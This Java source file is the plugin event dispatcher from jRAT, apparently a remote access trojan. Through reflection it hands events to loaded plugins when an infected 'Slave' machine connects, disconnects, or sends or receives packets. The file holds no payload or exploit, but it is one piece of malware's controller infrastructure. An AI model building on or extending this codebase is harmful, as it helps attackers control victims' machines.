package io.jrat.client.extensions;

import io.jrat.api.Packet;
import io.jrat.api.events.OnConnectEvent;
import io.jrat.api.events.OnDisconnectEvent;
import io.jrat.api.events.OnPacketEvent;
import io.jrat.api.events.OnSendPacketEvent;
import io.jrat.client.Slave;

public class PluginEventHandler {

	public static void onPacket(Slave slave, byte header) {
		for (Plugin plugin : PluginLoader.plugins) {
			try {
				plugin.getMethods().get("onpacket").invoke(plugin.getInstance(), new Object[] { new OnPacketEvent(RATObjectFormat.format(slave), new Packet(header)) });
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void onConnect(Slave slave) {
		for (Plugin plugin : PluginLoader.plugins) {
			try {
				plugin.getMethods().get("onconnect").invoke(plugin.getInstance(), new Object[] { new OnConnectEvent(RATObjectFormat.format(slave)) });
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void onDisconnect(Slave slave) {
		for (Plugin plugin : PluginLoader.plugins) {
			try {
				plugin.getMethods().get("ondisconnect").invoke(plugin.getInstance(), new Object[] { new OnDisconnectEvent(RATObjectFormat.format(slave)) });
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

	public static void onSendPacket(byte header, Slave slave) {
		for (Plugin plugin : PluginLoader.plugins) {
			try {
				plugin.getMethods().get("onsendpacket").invoke(plugin.getInstance(), new Object[] { new OnSendPacketEvent(new Packet(header), RATObjectFormat.format(slave)) });
			} catch (Exception e) {
				e.printStackTrace();
			}
		}
	}

}
